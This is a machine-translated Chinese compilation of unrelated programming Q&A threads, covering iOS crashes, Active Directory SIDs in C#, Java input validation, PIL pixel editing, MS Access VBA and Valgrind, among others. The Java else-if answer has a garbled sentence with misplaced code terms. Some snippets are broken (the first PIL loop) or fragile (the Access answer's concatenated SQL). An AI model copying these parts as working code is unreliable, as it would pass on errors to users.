> 赞同：0
> 
> 时间：2012-10-31T20:50:00.897
> 
> 标签：iphone, ios, xcode, nib

我一直在浏览档案，但没有找到可以回答这个问题的问题。所以我希望这很明显，我只是想念。

我有一个 iphone 应用程序，在过去 2 年里已经在商店中发布了各种版本。我终于对通过 nib 文件管理方向更改感到沮丧。所以我已经完全从项目中删除了我的笔尖，现在我通过代码创建了我的所有字段。

删除 nib 文件后，我在测试中看到了一个奇怪的崩溃。但我做了一些清理工作，无法重现它。所以我已经发货了产品。我的一小部分用户遇到了崩溃情况。

我相信我能够在我的调试器中重现它并得到这个输出。

```
2012-10-22 08:08:22.776 ChakraChimePro[60502:16d03] *** Terminating app due to uncaught exception 'NSUnknownKeyException', reason:
'[<CCProChimeViewController 0x8578100> setValue:forUndefinedKey:]: this class is not key value coding-compliant for the key btnRingBowl.' 
*** First throw call stack:
(0x1f57022 0x1ccacd6 0x1f56ee1 0x2b6022 0x227f6b 0x227edb 0x242d50 0x78871a 0x1f58dea 0x1ec27f1 0x78726e 0x62d1fc 0x62d779
0x62d99b 0x6490a9 0x648edd 0x6474aa 0x64729e 0x351b 0x564386 0x565274 0x574183 0x574c38 0x568634 0x20eaef5 0x1f2b195 0x1e8fff2
0x1e8e8da 0x1e8dd84 0x1e8dc9b 0x564c65 0x566626 0x2ef6 0x2e25)
terminate called throwing an exception(lldb) 
```

所以我已经完全删除了我的类属性 btnRingBowl。课堂上不再提及它。但我也完全删除了附加到 IBOutlet 的 nib 文件。所以不应该再提及它了。为什么我的二进制文件仍在尝试访问它？

我试过删除应用程序并重新安装，问题就消失了。我已经安装了与应用商店相同版本的应用，问题就消失了。我无法按需重现问题。但我可以重现它，它会导致我的用户崩溃。

因为我已经完全移除了笔尖和属性。我不知道我还能清理什么。有什么建议么？

我的项目的字符串搜索显示在任何地方都没有引用此名称。

谢谢，

凯文

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-13T18:35:56.150

遇到了同样的问题。NIB/XIB 文件很久以前就被删除了（在我初次提交之前），只有最近的更新修复才会弹出这个窗口。

我最终从 git 恢复了旧的 nib 文件，一切正常。然后删除损坏的 IB Outlets，使用这些 XIB 文件重建项目，然后继续。

我不确定恢复旧的 nib 文件是否适合您，如果不是，也许重建另一个同名的 nib 文件，并使用新的 nib 文件强制重建项目（因此它会清除旧的引用?)

# c# - 想要在不使用 samAccountName 或 DirectoryServices.AccountManagement 的情况下查找 AD 组的 SID

> ID：13167213
> 
> 赞同：3
> 
> 时间：2012-10-31T20:50:11.617
> 
> 标签：c#, asp.net-mvc, authentication, active-directory, authorization

### 问题：

*在 C# 中，有没有办法在不*使用`DirectoryServices.AccountManagement`库或 icky-ugly LDAP的情况下查找 Active Directory 组 SID ？

### [更新] - 为什么我要问：

`[Authorize]`属性和底层`WindowsPrincipal.IsInRole(string role)`仅针对`samAccountName`AD 中的检查。

这不仅是微软建议在检查角色时避免的遗留标识符：

```
// It is also better from a performance standpoint than the overload that accepts a string. 
// The aformentioned overloads remain in this class since we do not want to introduce a 
// breaking change. However, this method should be used in all new applications and we should document this.
public virtual bool IsInRole (SecurityIdentifier sid) {} 
```

但我也无法控制 AD，并且无法确保 samAccountName 与我们要求设置的“用户友好”名称保持同步。这就是问题首先出现的原因，传递复数（名称）而不是单数（samAccountName）字符串......值不一样。

此外，samAccountName 和 SID 可能会更改 - 例如，如果 AD 管理员删除帐户并重新创建它，SID 肯定会不同，samAccountName 是另一个人为错误的地方，但他们总是会恢复名称/UPN 值根据要求。

最终，我想编写一个我自己的干净的授权属性来检查组成员身份，而不必对 SAM 或 SID 进行硬编码。

我知道我可以使用 DirectoryServices.AccountManagement 做到这一点：

```
// get group principal 
var pc = new PrincipalContext(ContextType.Domain, "domainName");
var gp = GroupPrincipal.FindByIdentity(pc, IdentityType.Name, "groupName");
// check if user is in group.
var up = UserPrincipal.Current;
var usersGroups = up.GetGroups();
var inGroup = usersGroups.Contains(gp); 
```

我只是想知道是否有一种更简单、依赖性更小、非传统的方法来做到这一点，以保持要编程的属性尽可能精简。

我之前的相关问题： [Active Directory Group Membership Checking in .Net 4.5](https://stackoverflow.com/questions/13147132/active-directory-group-membership-checking-in-net-4-5/13166073#13166073)

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-10-31T21:17:39.630

你可以很容易地做到这一点 - 设置域上下文，找到组，获取`Sid`属性 - 像这样：

```
// set up domain context
PrincipalContext ctx = new PrincipalContext(ContextType.Domain);

// find your group - by group name, group DN, SAM Account Name - whatever you like! 
// This is **NOT** limited to just SAM AccountName!
GroupPrincipal group = GroupPrincipal.FindByIdentity(ctx, groupSamAccountName);

if(group != null)
{
    // this gives you the variable of type "SecurityIdentifier" to be used in your 
    // call to "IsInRole" ....
    SecurityIdentifier groupSid = group.Sid;
    string groupSidSDDL = groupSid.Value;
} 
```

另外：我不明白您对使用的反感`samAccountName`- 这是每个组的**强制性**和独特的属性 - 所以它是唯一标识您的组的完美匹配！

您应该检查`System.DirectoryServices.AccountManagement`(S.DS.AM) 命名空间。在这里阅读所有相关信息：

*   [在 .NET Framework 3.5 中管理目录安全主体](http://msdn.microsoft.com/en-us/magazine/cc135979.aspx)
*   [System.DirectoryServices.AccountManagement 上的 MSDN 文档](http://msdn.microsoft.com/en-us/library/system.directoryservices.accountmanagement.aspx)

新的 S.DS.AM 使得在 AD 中与用户和组一起玩变得非常容易！

# java - 使用 java 扫描器类时如何验证用户的文本输入？

> ID：13167218
> 
> 赞同：1
> 
> 时间：2012-10-31T20:50:45.577
> 
> 标签：java, validation, java.util.scanner

我是 Java 编程的初学者，正在寻找一些建议。我创建了一个非常简单的程序/应用程序，要求用户输入命令，这些命令依次在图形屏幕上以用户指定的位置、大小和颜色显示基本形状。

我已经使用扫描仪类从键盘获取用户输入（例如，用户类型**move 100 150**并且图形屏幕**笔**移动到 X = 100，Y = 150 或类型**circle 100**以在指定的 x，y 处显示圆半径 100协调）

如果用户输入了不正确的命令或尝试输入任何内容或随机击键（例如，如果他们拼错命令或没有为命令指定足够的值），我想返回错误消息

目前程序崩溃，必须重新启动

```
import java.util.Scanner;

public class Assign1 {

public final static void main(String [] args) {

    System.out.println("Let's draw something on the screen!");

    GraphicsScreen graphics = new GraphicsScreen();

Scanner input = new Scanner(System.in); // used to read the keyboard

    String next;    // stores the next line input
    String[] one;

    do {
        System.out.print("Enter a command (\"stop\") to finish : ");
        System.out.print("Type 'help' for a list of commands ");
        next = input.nextLine();
        one = next.split(" ");

        String command = one[0];

        if(next.contains("help")) {
            System.out.println("Type 'move' followed by an X and Y co-ordinate to move the graphical pointer.");
            System.out.println("Type 'circle' followed by a radius value to output a circle.");
            System.out.println("Type 'line' followed by an X and Y co-ordinate to draw a line.");
            System.out.println("Type 'clear' to reset the graphical canvas.");
        }

        if(next.contains("move")) {

            int x = 0;

            int y = 0;

            x = Integer.parseInt(one[1]);

            y= Integer.parseInt(one[2]);

            graphics.moveTo(x, y);

        } 

        if( command.equalsIgnoreCase("circle")) {

            int radius = 0;

            radius = Integer.parseInt(one[1]);

            graphics.circle(radius);

        } 

        if(command.equalsIgnoreCase("line")) {

            int x = 0;
            int y = 0;

            x = Integer.parseInt(one[1]);

            y= Integer.parseInt(one[2]);

            graphics.lineTo(x,y);

        }

        if(next.contains("clear")) {
            graphics.clear();
        }

    } while ( next.equalsIgnoreCase("stop") == false );

    System.out.println("You have decided to stop entering commands. Program terminated!");

    graphics.close(); 
```

我在另一个名为

```
graphicscreen.java 
```

我只是在寻找有关如何验证用户文本输入的建议，以便在键入除我的特定命令之一之外的任何内容时给出错误消息。

我尝试过使用 if 语句和 while 循环以及我在各种网页上找到的其他语句，但还没有一个起作用。

任何建议都非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T20:53:52.197

使用`nested if-else`而不是`only if`.

```
 if(command1istrue){
  }
else if(command2istrue){

 }
else if(command3istrue){
}
else {
system.out.println("Error you have entered the wrong command");
} 
```

[在这里](http://www.macs.hw.ac.uk/~pjbk/pathways/cpp1/node99.html)检查

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-31T20:54:25.053

使用`else if`和`else`。只有当它上面的所有and条件评估为 时，`else if`才会检查一个条件。只有当它上面的所有和条件评估为时，一个块才会运行。`if``else if``false``else``if``else if``false`

```
if(next.contains("move")) {
} 
else if( command.equalsIgnoreCase("circle")) {
} 
else if(command.equalsIgnoreCase("line")) {
}
else if(next.contains("clear")) {
}
else {
 //input invalid
} 
```

# php - 根据 GET 参数更改 Facebook og 元标记？

> ID：13167223
> 
> 赞同：1
> 
> 时间：2012-10-31T20:51:05.343
> 
> 标签：php, facebook, facebook-graph-api, facebook-opengraph

我有一个网页，我想使用 Facebook 按钮“点赞”。我有 Open Graph 元标记设置：

```
<meta property="og:title" content="...
<meta property="og:description" content="...
<meta property="og:image" content="... 
```

我有我的页面设置，以便根据 URL 中的 GET 参数更改 OG 标签。

在其他地方，当我像这样创建一些 LIKE 按钮时：

```
<div class="fb-like" data-href="http://www.mysite.com/mypage/?myparam=test1" style="display:inline;" data-send="false" data-layout="button_count" data-width="55" data-show-faces="false"></div>

<div class="fb-like" data-href="http://www.mysite.com/mypage/?myparam=test2" style="display:inline;" data-send="false" data-layout="button_count" data-width="55" data-show-faces="false"></div> 
```

可以看到两个 URL 中的 GET 参数是不同的。当我在浏览器中访问这些 URL 时，正确的 og 元标记位于源代码中。

但是当我单击 LIKE 按钮时，它似乎忽略了 GET 参数并仅抓取基本/默认 og 元标记以发布到 Facebook。

这是设计使然还是我做错了什么？有没有办法在不创建不同页面/URL/路由的情况下使用备用 og 元标记？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-31T20:58:35.457

`og:url`Facebook 现在从标签中的规范 url 中提取打开的图形数据。

如果您想使用 GET 变量更改元数据，您还必须让脚本动态地将它们添加到`og:url`内容中。

# testing - 如何在 PhoneGap 中运行测试

> ID：13167227
> 
> 赞同：1
> 
> 时间：2012-10-31T20:51:29.460
> 
> 标签：testing, cordova

如何运行位于 /www/spec 文件夹中的测试？

很抱歉这个问题，但 PhoneGap 完全缺乏文档。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-31T22:16:47.840

在浏览器中打开`www/spec.html`文件。

# google-chrome-devtools - 有没有办法将响应正文复制到 Chrome 开发工具中的剪贴板？

> ID：13167233
> 
> 赞同：10
> 
> 时间：2012-10-31T20:51:43.343
> 
> 标签：google-chrome-devtools

Firebug 允许您通过上下文菜单项将响应正文复制到剪贴板。Chrome 开发工具是否有类似的功能？如果是这样，它位于哪里？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2015-02-02T12:35:30.043

在 下`Network`，右键单击请求，选择`Copy Response`。

* * *

![在此处输入图像描述](../Images/6d8d97012568791c941c1817c2b7ba55.png)

* * *

使用 Chrome 40.0.2214.93

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-08T17:11:48.467

在 Elements 下，然后在左窗格中，右键单击您感兴趣的元素，例如 body 标签，单击 COPY as HTML

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-10T18:13:22.133

以下不会碰巧是您要问的吗？

![从 HTTP 响应正文中选择和复制](../Images/214f417ab198e7938590238d84ae9a69.png)

使用 Chrome 23.0.1271.52 beta-m

# c# - 操作像素 WritableBitmapEx

> ID：13167237
> 
> 赞同：0
> 
> 时间：2012-10-31T20:52:15.753
> 
> 标签：c#, wpf, writablebitmap

在 WritableBitmap 中操作像素的快速方法是什么（我也使用 WritableBitmapEx 扩展）？SetPixel 对于像为我的 Paint-like 应用程序填充背景这样的事情来说是非常慢的方法，它还会做一些奇怪的事情，比如内存损坏（不知道为什么）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T21:29:10.277

SetPixel 非常慢 - 这是真的。

您应该使用 LockBits 方法，然后使用不安全代码（像素指针）迭代所有像素。

例子：

```
// lock the bitmap.
var data = image.LockBits(
              new Rectangle(0, 0, image.Width, image.Height), 
              ImageLockMode.ReadWrite, image.PixelFormat);
try
{
    unsafe
    {
        // get a pointer to the data.
        byte* ptr = (byte*)data.Scan0;

        // loop over all the data.
        for (int i = 0; i < data.Height; i++)
        {
            for (int j = 0; j < data.Width; j++)
            {
                operate with pixels.
            }
        }
    }
}
finally
{
    // unlock the bits when done or when 
    // an exception has been thrown.
    image.UnlockBits(data);
} 
```

我建议你阅读[这篇文章](https://web.archive.org/web/20141229164101/http://bobpowell.net/lockingbits.aspx)。

# ruby-on-rails-3.1 - 当可评论可以属于另一个可评论时，如何查询多态评论？

> ID：13167248
> 
> 赞同：2
> 
> 时间：2012-10-31T20:53:18.543
> 
> 标签：ruby-on-rails-3.1, comments, polymorphism

所以我正在尝试对多态模型进行相对高级的查询。我有以下型号：

```
class Project < ActiveRecord::Base
  has_many :project_stakeholders, :dependent => :destroy
  has_many :features, :dependent => :destroy
  has_many :iterations, :dependent => :destroy
  has_many :comments, :as => :commentable, :dependent => :destroy
end

class ProjectStakeholder < ActiveRecord::Base
  belongs_to :project
  has_many :comments, :as => :commentable, :dependent => :destroy
end

class Feature < ActiveRecord::Base
  belongs_to :project
  has_many :comments, :as => :commentable, :dependent => :destroy
end

class Iteration < ActiveRecord::Base
  belongs_to :project
  has_many :comments, :as => :commentable, :dependent => :destroy
end

class User < ActiveRecord::Base
  has_many :comments, :dependent => :destroy
end

class Comment < ActiveRecord::Base
  belongs_to :commentable, :polymorphic => true
  belongs_to :created_by, :class_name => 'User'
end 
```

我正在尝试查找特定项目（project.comments、project.features.comments、project.iterations.comments、project.project_stakeholder.comments）的 current_user 评论，并按 created_at 降序对它们进行排序。

我想出的最好的是：

```
Class Project < ActiveRecord::Base
  def all_comments_for_user(user)
    Comment.where(:created_by_id => user.id).select { |c| c.commentable.attributes.has_key?('project_id') }.select { |c| c.commentable.project == self } | comments.where(:created_by_id => user)
  end
end 
```

但这并没有解决降序的 create_at 序列。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-01T14:09:07.097

```
Class Project < ActiveRecord::Base
  def all_comments_for_user(user)
    Comment.where(:created_by_id => user.id).order('created_at DESC').select { |c| c.commentable.attributes.has_key?('project_id') }.select { |c| c.commentable.project == self } | comments.where(:created_by_id => user)
  end
end 
```

这行得通吗？我刚刚添加了 order('created_at DESC')

# validation - 如何将 Telerik DatePicker 日期格式验证与 Webforms ValidationSummary 集成

> ID：13167256
> 
> 赞同：0
> 
> 时间：2012-10-31T20:53:44.360
> 
> 标签：validation, telerik, datepicker

Telerik DatePicker 不支持 WebForms CompareValidator 的数据类型检查，因为当输入无效日期时，DatePicker 在输入框上显示错误样式，但返回一个空值。因此，在具有可选日期字段的数据输入表单上，需要一些方法来处理无效日期，以便它们不会在回发时显示为空字段。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-31T20:53:44.360

通过使用 CustomValidator，我们可以检查 DatePicker 在输入文本框中是否有值但返回一个空字符串——这表明日期格式无效。

```
function DateValidate(sender, args) {
   var datepicker = document.getElementById(sender.controltovalidate).control;
   var dateInput = datepicker.get_dateInput();
   args.IsValid = !(dateInput.get_textBoxValue() != "" && dateInput.get_value() == "");
}

<telerik:RadDatePicker
   ID="RetiredDatePicker" dbSelectedDate='<%# Bind("RetiredDate") %>' Runat="server">
</telerik:RadDatePicker>
<asp:CustomValidator
   ID="RetiredDateValidator" runat="server" CssClass="Error" 
   ClientValidationFunction="DateValidate" ValidateEmptyText="true"
   ControlToValidate="RetiredDatePicker"  SetFocusOnError="True" 
   ErrorMessage="Retired date is not a valid date">*</asp:CustomValidator> 
```

# javascript - 将模拟与 Angular 的场景运行器一起使用

> ID：13167265
> 
> 赞同：5
> 
> 时间：2012-10-31T20:54:03.367
> 
> 标签：javascript, mocking, tdd, angularjs

在角度单元测试中，可以创建模拟并将它们注入控制器。我想在 e2e 测试中做同样的事情。这可能吗？我环顾四周，但找不到太多。

我认为答案可能与[ngMockE2E.$httpBackend 有关](http://docs.angularjs.org/api/ngMockE2E.$httpBackend)。

这是我希望它看起来像的示例：

```
describe('server status', function() {

    beforeEach(function() {
        var backend = new HttpBackend(); // or however you get an instance
        backend.get('/foo', 'bar');
        injectBackend(backend);
    });

    it('should display data from server', function() {
        expect(element('.dataFromServer').text()).toBe('bar');
    });
}); 
```

这可能吗？

（我正在使用 Testacular 和 Jasmine，物有所值。）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-29T21:19:49.770

您*可以*使用[jasmine 的间谍](https://github.com/pivotal/jasmine/wiki/Spies)，它用于间谍、存根和模拟。这是[一个创建具有两个存根依赖项的控制器实例的示例](https://github.com/roytruelove/angular-grunt-coffeescript/blob/master/src/test/detailsView/detailsViewSpec.coffee)。它在咖啡脚本中，但您可以在[此处](http://js2coffee.org/)转换它。

取决于您要查找的内容，尽管 $httpBackend 听起来像我会做的事情。（见 SonOfNun 的评论）

# ios - 为 iOS SDK 迁移 Facebook 身份验证凭据

> ID：13167266
> 
> 赞同：2
> 
> 时间：2012-10-31T20:54:04.350
> 
> 标签：ios, facebook, facebook-ios-sdk

有没有人有从旧的 iOS FB SDK（托管在他们的 GitHub 帐户上的那个）迁移到他们的 .framework（基于包的安装程序）的任何提示？我在获取现有身份验证令牌和到期日期对象以针对新的 FBSession 对象进行验证时遇到问题。

**情况**如下：

在旧的 SDK/技术中，Facebook iOS SDK 要求您保存身份验证等内容。令牌和到期日期通过您自己的存储机制手动进行。在基于新框架的 SDK 中，他们现在为您处理此问题，但为了迁移用户（即不让他们重新登录），我需要将此信息提供给新 SDK。

最终，Facebook 将 K-V 存储在 NSUserDefaults 中，他们甚至会告诉您根键名称以及它们用于存储此信息的字典的嵌套 K-V 的所有键。

他们的令牌类`FBSessionTokenCachingStrategy`甚至有一个类方法来验证 NSDictionary 是否验证到建立可用 Facebook 会话的正确字典

`+ (BOOL)isValidTokenInformation:(NSDictionary*)tokenInformation;`

所以我接受了我预先存在的身份验证。令牌和到期，将它们放入新字典中，将其存储在正确的键位位置并同步 NSUserDefaults。

到目前为止还不错吧？好吧，一旦我通过初始化一个`FBSession`对象

`- (id)initWithAppID:(NSString*)appID permissions:(NSArray*)permissions urlSchemeSuffix:(NSString*)urlSchemeSuffix tokenCacheStrategy:(FBSessionTokenCachingStrategy*)tokenCachingStrategy;`

整个键从 NSUserDefaults 中删除，并且会话对象的`state`属性处于`FBSessionStateCreated`（即没有预先存在的状态）与它应该是什么状态`FBSessionStateCreatedTokenLoaded`（即它知道它具有本地保存的属性并准备在线检查）的状态。

为什么会被移除？它针对类方法进行了验证。

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-01T14:41:50.270

事实证明，较新的 Facebook SDK 的本地存储对象还保留了与令牌相关的权限列表。这在以前不是必需的，所以虽然我没有在本地保存它，但我的权限列表没有改变。所以我所做的还将权限列表保存到新的存储对象中（总共 3 个键：auth.token、到期日期和权限列表）。

完成此操作后，创建/初始化`FBSession`对象并不会删除我本地存储的对象，并且在调用`openWithCompletionHandler:`它时将预期的会话状态建立为`FBSessionStateOpen`.

# html - 带空格的 CSS

> ID：13167267
> 
> 赞同：1
> 
> 时间：2012-10-31T20:54:09.483
> 
> 标签：html, css

我目前正在尝试按照教程制作图像画廊 a-la-Apple 但现在，我遇到了一个我无法理解原因的小问题。

这是 JSFiddle：[JSFiddle](http://jsfiddle.net/SA3d4/2/)。

`li`如果您检查正确，您应该会在滑块中的子菜单的第二项和第三项顶部看到一个空白区域。第一个没有。

有想要的结果：[Tutorialzine](http://demo.tutorialzine.com/2009/11/beautiful-apple-gallery-slideshow/demo.html)

如果有人能找到原因，将不胜感激！

***注意：我正在使用 Twitter Bootstrap！***

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T21:01:23.787

**基于列表的菜单的规则 #1**：使用 display:block 将所有样式放在 A-tag 上。除了浮动/定位之外，不要设置 LI 标签的样式。

请参阅我的教程： http: [//preview.moveable.com/jm/ilovelists/](http://preview.moveable.com/jm/ilovelists/)

# python - 更改像素颜色 Python

> ID：13167269
> 
> 赞同：11
> 
> 时间：2012-10-31T20:54:23.930
> 
> 标签：python, image-processing

我想从我的福禄克机器人那里获取图像并确定图像中每个像素的颜色。然后，如果像素大部分是红色，则将其更改为完全绿色。如果像素大部分为绿色，则将其更改为完全蓝色。如果像素大部分是蓝色的，则将其更改为完全红色。这是我能够做到的，但我无法让它发挥作用来获得我必须改变的形象。没有语法错误，这只是我遇到问题的语义。我正在使用python。

我尝试的代码：

```
import getpixel
getpixel.enable(im)  
r, g, b = im.getpixel(0,0)  
print 'Red: %s, Green:%s, Blue:%s' % (r,g,b) 
```

我还保存了如下图片：

```
pic1 = makePicture("pic1.jpg"):
    for pixel in getpixel("pic1.jpg"):
        if pixel Red: %s:
           return Green:%s
        if pixel Green:%s: 
           return Blue:%s 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-10-31T21:02:57.547

我假设您正在尝试使用该`Image`模块。这是一个例子：

```
from PIL import Image
picture = Image.open("/path/to/my/picture.jpg")
r,g,b = picture.getpixel( (0,0) )
print("Red: {0}, Green: {1}, Blue: {2}".format(r,g,b)) 
```

在这张[图片](http://image.gsfc.nasa.gov/image/image_launch_a5.jpg)上运行它，我得到了输出：

```
>>> from PIL import Image
>>> picture = Image.open("/home/gizmo/Downloads/image_launch_a5.jpg")
>>> r,g,b = picture.getpixel( (0,0) )
>>> print("Red: {0}, Green: {1}, Blue: {2}".format(r,g,b))
Red: 138, Green: 161, Blue: 175 
```

编辑：做你想做的事，我会尝试这样的事情

```
from PIL import Image
picture = Image.open("/path/to/my/picture.jpg")

# Get the size of the image
width, height = picture.size()

# Process every pixel
for x in width:
   for y in height:
       current_color = picture.getpixel( (x,y) )
       ####################################################################
       # Do your logic here and create a new (R,G,B) tuple called new_color
       ####################################################################
       picture.putpixel( (x,y), new_color) 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2014-02-14T21:29:08.817

你有错误：

```
# Get the size of the image

width, height = picture.size()

for x in range(0, width - 1):

        for y in range(0, height - 1): 
```

1.  括号是错误的！！省略它们。
2.  int 不可迭代。

我还建议您使用 load()，因为它要快得多：

```
pix = im.load()

print pix[x, y]

pix[x, y] = value 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2018-01-16T10:26:58.720

我正在使用 python 3.6.4 和 Pillow 5.0.0。Gizmo 的代码片段对我不起作用。经过一些工作，我创建了一个固定的片段：

```
import Image
picture = Image.open("/path/to/my/picture.jpg")

# Get the size of the image
width, height = picture.size

# Process every pixel
for x in range(width):
   for y in range(height):
       current_color = picture.getpixel( (x,y) )
       ####################################################################
       # Do your logic here and create a new (R,G,B) tuple called new_color
       ####################################################################
       picture.putpixel( (x,y), new_color) 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2018-02-20T11:40:35.223

```
import cv2
import numpy as np

m =  cv2.imread("C:/../Sample Pictures/yourImage.jpg")

h,w,bpp = np.shape(m)

for py in range(0,h):
    for px in range(0,w):
#can change the below logic of rgb according to requirements. In this 
#white background is changed to #e8e8e8  corresponding to 232,232,232 
#intensity, red color of the image is retained.
        if(m[py][px][0] >200):            
            m[py][px][0]=232
            m[py][px][1]=232
            m[py][px][2]=232

cv2.imshow('matrix', m)
cv2.waitKey(0)
cv2.imwrite('yourNewImage.jpg',m) 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-01-28T02:48:00.837

在 Gizmo 的回答中添加一些评论。这：

```
px = im.load()
current_color = (px[i, j]) 
```

可能比这更快：

```
picture.getpixel( (x,y) ) 
```

另外，请确保使用此：

```
 picture.putdata(colors) 
```

而不是这个循环内：

```
picture.putpixel( (x,y), new_color) 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2021-12-10T12:40:47.080

更改图片上像素的颜色 Меняем цвет пикселя в картинке(меняем фон)

[https://colorscheme.ru/color-converter.html¶](https://colorscheme.ru/color-converter.html%C2%B6)

在图片上找到一种颜色并更改 На всей картинке находит цвет и заменяет его другим。

```
import numpy as np  
from PIL  
import Image 
import os,sys

im = Image.open('1.png')  
data = np.array(im)

#Original value(цвет который будем менять)  
r1, g1, b1 = 90, 227, 129 

#Value that we want to replace it with(цвет выхода)  
r2, g2, b2 = 140, 255, 251

red, green, blue = data[:,:,0], data[:,:,1], data[:,:,2] 

mask = (red == r1) & (green == g1) & (blue == b1)

data[:,:,:3][mask] = [r2, g2, b2]

im = Image.fromarray(data) 

im.save('1_mod.png') 
```

# ms-access - 使用报告中的数据向表中添加一行？

> ID：13167273
> 
> 赞同：1
> 
> 时间：2012-10-31T20:54:32.510
> 
> 标签：ms-access, automation, vba, report

现在，我有一个数据库，它允许用户根据使用参数的表中的查询创建基本报告。很简单。我现在要做的是每次创建报表时使用 VBA 将记录添加到单独的表中。每个报告都包含来自查询的信息以及一些新信息（连接的 ID、日期等）。新表（“摘要”）将包括一些新信息以及来自原始查询的一些来源。这将是一种创建报告的动态日志。

有什么方法可以使用 VBA 将来自两个源的数据（显示在原始查询的报表上的数据和本机报表数据）合并到一个表中的一条记录中？

这是我到目前为止的代码。

```
Option Compare Database

Public Sub Log_Report()

'System definitions
Dim dbs As DAO.database
Dim rs As DAO.Recordset
Dim rep As [Report_Custom MARS Report]

'Original report sources
Dim Text267 As String
Dim TableName As String
Dim Company_Name As String
Dim ReportID As String

'Summary table destination
Dim ID As Integer
Dim Date_Created As Date
Dim Source As String
Dim Title As String
Dim report_ID As String
Dim Attachment As Attachment

End Sub 
```

我可能已经离开了，所以如果我必须重新开始，我可以接受。无论如何，我都不是 VBA 专家，所以到目前为止，我经历了很多试验和错误。

如果需要，我可以澄清。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-31T22:43:55.003

如果您的报告的记录集是单行，则使用 on load 事件读取字段并将它们分配给变量会相对容易。在您的 Report_Load 事件触发时，所有计算都已完成，然后您可以将它们用作将值写入汇总表的函数的输入。

```
'Code to placed in a public function
'strVar = text267 'is ReportID = report_ID ? 
'Unfortunately I have no experience with attachments, sorry

function writeReportSummary(intID as Integer, dtmDate_Created as Date, strSource as String, strTitle as string, strReportID as string, strVar as string, strTableName as string, strCompanyName as string, attAttachment as attachment) AS boolean

Dim strSQL as string
On error goto Err_Handler

strSQL = "INSERT INTO summary( ID, Date_Created, Source, Title, report_ID, Text267, tableName, Company_Name, ReportID) SELECT """ & intID & """ , """ & dtmDate & """;" 'etc
CurrentDb.execute strSQL, dbFailOnError
Debug.print CurrentDB.recordsAffected & ": Record(s) Inserted at " & now()
writeReportSummary = True
Exit function

Err_Handler:
debug.print err.number
debug.print err.description
writeReportSummary = false
end function

'Code to be placed in Report_load'
Sub Report_Load

if Not(writeReportSummary(intID, dtmDate, etc)) then debug.print "Failed to write report to summary table"

End Sub 
```

# c - Valgrind 没有捕获 Segfaults

> ID：13167277
> 
> 赞同：4
> 
> 时间：2012-10-31T20:55:05.157
> 
> 标签：c, segmentation-fault, valgrind

我知道 Valgrind 以允许捕获段错误的方式跟踪内存。但是，为什么没有捕捉到以下段错误？

```
int main() {
    char *x = calloc(16, 1);
    char *y = calloc(16, 1);

    x[80] = 'c';
    y[-80] = 'c';

    printf("%c %c\n", *x, *y);
    return 0;
} 
```

它不应该捕获堆中的越界访问吗？根据 Valgrind 的文档：

```
But it should detect many errors that could crash your program (eg. cause a segmentation fault). 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-31T21:23:37.243

我认为你赋予 valgrind 权力而不是可能的权力。

它会尝试检测各种类型的错误并将它们报告给您，但它不可能检测到所有错误，即使在它尝试检测的某些错误类别中也是如此。

在这种情况下，您正在处理的是对数组的越界写入，如果 valgrind 设法捕获它，将被报告为“无效写入”错误。这些是通过跟踪哪些地址是“有效的”来检测的，因为它们是已知堆块的一部分。

问题是，如果你索引太远超出数组的开头或结尾，你实际上可能会得到一个在相邻块中是有效地址的地址，因此对于 valgrind 来说看起来绝对没问题。为了减少这种情况发生的可能性，valgrind 在块的每一侧添加了一个填充区域（称为“红色区域”），但默认情况下只有 16 个字节。

如果您使用该`--redzone-size=128`选项增加红色区域的大小，那么您会发现 valgrind 确实检测到该程序中的错误。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-31T21:20:50.153

为我工作：

```
==24344== Memcheck, a memory error detector.
==24344== Copyright (C) 2002-2007, and GNU GPL'd, by Julian Seward et al.
==24344== Using LibVEX rev 1854, a library for dynamic binary translation.
==24344== Copyright (C) 2004-2007, and GNU GPL'd, by OpenWorks LLP.
==24344== Using valgrind-3.3.1-Debian, a dynamic binary instrumentation framework.
==24344== Copyright (C) 2000-2007, and GNU GPL'd, by Julian Seward et al.
==24344== For more details, rerun with: -v
==24344== 
==24344== Invalid write of size 1
==24344==    at 0x8048419: main (testValgrind.c:5)
==24344==  Address 0x418f078 is 0 bytes after a block of size 16 alloc'd
==24344==    at 0x4021E22: calloc (vg_replace_malloc.c:397)
==24344==    by 0x804840F: main (testValgrind.c:3)
==24344== 
==24344== Invalid write of size 1
==24344==    at 0x8048422: main (testValgrind.c:6)
==24344==  Address 0x418f018 is 16 bytes before a block of size 16 alloc'd
==24344==    at 0x4021E22: calloc (vg_replace_malloc.c:397)
==24344==    by 0x80483F8: main (testValgrind.c:2)

==24344== 
==24344== ERROR SUMMARY: 2 errors from 2 contexts (suppressed: 12 from 1)
==24344== malloc/free: in use at exit: 32 bytes in 2 blocks.
==24344== malloc/free: 2 allocs, 0 frees, 32 bytes allocated.
==24344== For counts of detected errors, rerun with: -v
==24344== searching for pointers to 2 not-freed blocks.
==24344== checked 58,940 bytes.
==24344== 
==24344== LEAK SUMMARY:
==24344==    definitely lost: 32 bytes in 2 blocks.
